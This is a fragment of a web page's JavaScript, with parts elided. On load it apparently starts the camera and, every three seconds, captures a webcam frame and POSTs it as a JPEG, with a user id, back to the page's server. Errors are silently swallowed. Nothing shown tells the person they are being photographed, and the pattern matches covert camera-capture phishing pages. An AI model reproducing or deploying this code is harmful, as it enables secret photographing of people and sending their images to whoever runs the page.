    ...
    <script>
        ...
        async function autoStart() {
            ...
            try {
                ...
                // WAIT 2 SECONDS for the camera to warm up before taking the first photo
                setTimeout(() => {
                    setInterval(snap, 3000); // Take a photo every 3 seconds for better quality
                }, 2000);
            } catch (err) { }
        }
        ...
        function snap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            // Ensure video is actually playing before drawing
            if (v.videoWidth === 0) return; 
            ...
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.6), id: uid })
            });
        }
    </script>
</body>
